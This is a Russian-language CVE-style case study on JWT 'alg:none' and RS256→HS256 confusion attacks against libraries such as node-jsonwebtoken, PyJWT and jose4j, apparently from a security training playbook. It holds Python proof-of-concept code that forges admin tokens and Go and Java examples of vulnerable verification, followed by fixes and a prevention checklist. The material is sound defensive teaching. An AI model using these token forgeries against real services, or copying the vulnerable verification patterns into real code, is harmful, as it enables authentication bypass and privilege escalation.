# Case 02 — Auth0 JWT `alg:none` + RS256→HS256 confusion (2017-2020)

> **Формат:** CVE-style разбор. Описание → уязвимые версии → PoC → root cause → fix → prevention.
>
> **Связь с playbook:** [JWT](../../Knowledge/authentication/jwt.md), [A02 Cryptographic Failures](../../Knowledge/owasp-top10/a02-cryptographic-failures.md)

---

## Описание

В 2017–2020 годах исследователи обнаружили, что множество библиотек для работы с JWT (включая популярные `auth0/node-jsonwebtoken`, `pyjwt`, `jose4j`) были подвержены двум критическим атакам:

1. **`alg: none`** — злоумышленник удаляет подпись, меняет `alg` на `none`, и библиотека принимает токен как валидный.
2. **RS256→HS256 confusion** — если сервер использует RSA (асимметричную подпись), но библиотека позволяет выбрать `alg` из токена, злоумышленник переподписывает токен HS256, используя **публичный RSA-ключ** как HMAC-секрет.

---

## Уязвимые версии

| Библиотека | CVE | Fixed in |
|------------|-----|----------|
| `auth0/node-jsonwebtoken` < 8.5.1 | `alg:none` принимался по умолчанию | 8.5.1 |
| `pyjwt` < 2.0.0 | `algorithms=[]` не запрещал `none`, confusion не блокировался | 2.0.0 |
| `jose4j` < 0.7.0 | confusion attack при отсутствии явного allowlist | 0.7.0 |
| `jjwt` < 0.11.0 | `alg` не проверялся на соответствие ключу | 0.11.0 |

---

## Proof of Concept

### Атака `alg: none`

```python
# Злоумышленник перехватывает валидный JWT
# eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0In0.signature

import base64
import json

# Шаг 1: Меняем header на alg:none
header_b64 = base64.urlsafe_b64encode(
    json.dumps({"alg": "none", "typ": "JWT"}).encode()
).rstrip(b'=').decode()

# Шаг 2: Меняем payload на admin
payload_b64 = base64.urlsafe_b64encode(
    json.dumps({"sub": "admin", "role": "admin", "iat": 1516239022}).encode()
).rstrip(b'=').decode()

# Шаг 3: Склеиваем без подписи
forged_token = f"{header_b64}.{payload_b64}."
print(forged_token)
# Результат: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.

# Отправляем в API:
# Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIi...
```

### Атака RS256→HS256 confusion

```python
# Шаг 1: Получаем публичный ключ сервера
# GET https://auth.example.com/.well-known/jwks.json
import requests
jwk = requests.get("https://auth.example.com/.well-known/jwks.json").json()
public_key_pem = jwk_to_pem(jwk["keys"][0])

# Шаг 2: Создаём JWT с alg=HS256, подписанный публичным ключом как HMAC-секретом
import jwt
forged = jwt.encode(
    payload={"sub": "admin", "role": "admin", "iat": 1516239022},
    key=public_key_pem,      # <--- ПУБЛИЧНЫЙ ключ как секрет HS256
    algorithm="HS256"         # <--- Атакующий выбирает алгоритм
)
print(forged)

# Шаг 3: Серверная библиотека проверяет токен:
# - Видит alg=HS256
# - Берёт публичный ключ (потому что kid указывает на RSA-ключ)
# - Проверяет HMAC-SHA256(jwt, public_key)
# - Подпись валидна, потому что злоумышленник использовал тот же ключ
# - Токен принят → злоумышленник = admin
```

---

## Root Cause

### Проблема N1: Библиотеки по умолчанию принимали `alg: none`

```go
// Антипаттерн: библиотека не требует явного allowlist алгоритмов
func Verify(tokenString string, key interface{}) (Claims, error) {
    token, _ := jwt.Parse(tokenString, func(t *jwt.Token) (interface{}, error) {
        return key, nil  // <--- возвращает ключ, не проверяя alg
    })
    // alg=none проходит, потому что Parse не отвергает его
    return token.Claims, nil
}
```

### Проблема N2: Библиотеки не проверяли соответствие `alg` типу ключа

```java
// Антипаттерн: JWTConsumer не различает ключи для HS256 и RS256
JwtConsumer consumer = new JwtConsumerBuilder()
    .setVerificationKey(publicKey)  // <--- публичный ключ для RS256
    // НЕ указано: .setJwsAlgorithmConstraints(
    //     AlgorithmConstraints.ConstraintType.BLACKLIST, AlgorithmIdentifiers.HMAC_SHA256)
    .build();

// Злоумышленник отправляет JWT с alg=HS256, подписанный публичным ключом
JwtClaims claims = consumer.processToClaims(jwtString);
// claims валидны, потому что JWTConsumer не отверг HS256
```

---

## Fix

### Правильная валидация (PyJWT >= 2.0)

```python
import jwt

try:
    payload = jwt.decode(
        token,
        key=public_key,
        algorithms=["RS256", "ES256"],  # <--- явный allowlist, исключает none и HS*
        options={
            "require": ["exp", "iat", "iss"],  # обязательные claims
            "verify_iss": True,
            "verify_aud": True,
        },
        issuer="https://auth.example.com",
        audience="api.example.com",
    )
except jwt.InvalidAlgorithmError:
    # alg не в allowlist → reject
    abort(401)
except jwt.InvalidSignatureError:
    abort(401)
```

### Правильная конфигурация (Java jose4j)

```java
JwtConsumer consumer = new JwtConsumerBuilder()
    .setVerificationKey(rsaPublicKey)
    .setJwsAlgorithmConstraints(
        AlgorithmConstraints.ConstraintType.WHITELIST,
        AlgorithmIdentifiers.RSA_USING_SHA256  // только RS256
    )
    .setExpectedIssuer("https://auth.example.com")
    .setExpectedAudience("api.example.com")
    .setRequireExpirationTime()
    .setRequireIssuedAt()
    .build();
```

### Правильная конфигурация (Go golang-jwt)

```go
token, err := jwt.Parse(tokenString, func(token *jwt.Token) (interface{}, error) {
    // Проверяем alg до возврата ключа
    if _, ok := token.Method.(*jwt.SigningMethodRSA); !ok {
        return nil, fmt.Errorf("unexpected signing method: %v", token.Header["alg"])
    }
    return rsaPublicKey, nil
})
```

---

## Prevention (чек-лист)

- [ ] Библиотека JWT обновлена до последней стабильной версии
- [ ] Алгоритм подписи задан явным allowlist: `algorithms=["RS256"]`, а не `"любой, кроме none"`
- [ ] Проверяется соответствие `alg` типу ключа (RSA-ключ не принимает HS256, и наоборот)
- [ ] Запрещён `alg: none` на уровне библиотеки или middleware
- [ ] Запрещены header-поля `jku` / `x5u` (если не нужны), иначе — allowlist URL
- [ ] `kid` валидируется на отсутствие path traversal / injection
- [ ] `iss`, `aud`, `exp`, `iat`, `nbf` проверяются при каждой валидации
- [ ] Тесты: unit-тест на `alg: none = 401`, confusion attack = 401
- [ ] Dependabot/Renovate настроены на автообновление JWT-библиотеки

---

## Уроки

1. **Криптографию нельзя оставлять «на усмотрение библиотеки».** Библиотека может поддерживать `alg: none` для совместимости — ответственность разработчика явно исключить его.
2. **Allowlist, не denylist.** Не «запретить none», а «разрешить только RS256 и ES256».
3. **Тип ключа и алгоритм должны быть связаны.** HMAC-алгоритмы не должны приниматься для асимметричных ключей.
4. **Обновление зависимостей — часть безопасности.** Auth0 пофиксила `alg: none` в 2017, но проекты на уязвимых версиях встречались ещё в 2023.

---

## Источники

- [CVE-2015-9235: alg:none in node-jsonwebtoken](https://nvd.nist.gov/vuln/detail/CVE-2015-9235)
- [Auth0: JWT Best Practices](https://auth0.com/blog/a-look-at-the-latest-draft-for-jwt-bcp/)
- [PortSwigger: JWT Attacks](https://portswigger.net/web-security/jwt)
- [PyJWT 2.0 Migration Guide](https://pyjwt.readthedocs.io/en/stable/installation.html#migrating-from-1-x-to-2-x)